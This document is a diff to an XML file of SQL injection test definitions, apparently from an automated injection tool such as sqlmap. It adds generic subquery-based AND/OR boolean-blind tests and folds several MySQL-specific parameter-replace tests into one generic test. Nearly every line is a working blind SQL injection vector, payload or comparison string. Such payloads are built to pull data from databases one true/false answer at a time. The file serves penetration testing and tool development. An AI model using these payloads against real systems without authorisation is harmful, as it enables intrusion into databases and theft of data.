@@ -204,6 +204,40 @@ Tag: <test>
     </test>
 
     <test>
+        <title>AND boolean-based blind - WHERE or HAVING clause (subquery) (Generic comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
+        <request>
+            <payload>AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
+        </response>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause (subquery) (Generic comment)</title>
+        <stype>1</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</payload>
+            <comment>[GENERIC_SQL_COMMENT]</comment>
+        </request>
+        <response>
+            <comparison>OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
+        </response>
+    </test>
+
+    <test>
         <title>AND boolean-based blind - WHERE or HAVING clause (Generic comment)</title>
         <stype>1</stype>
         <level>2</level>
@@ -566,83 +600,19 @@ Tag: <test>
 
     <!-- Boolean-based blind tests - Parameter replace -->
     <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - Parameter replace</title>
+        <title>Boolean-based blind - Parameter replace (original value)</title>
         <stype>1</stype>
         <level>1</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))</comparison>
         </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.0 boolean-based blind - Parameter replace (original value)</title>
-        <stype>1</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - Parameter replace</title>
-        <stype>1</stype>
-        <level>2</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&lt; 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &lt; 5.0 boolean-based blind - Parameter replace (original value)</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</vector>
-        <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</payload>
-        </request>
-        <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))</comparison>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&lt; 5.0</dbms_version>
-        </details>
     </test>
 
     <test>
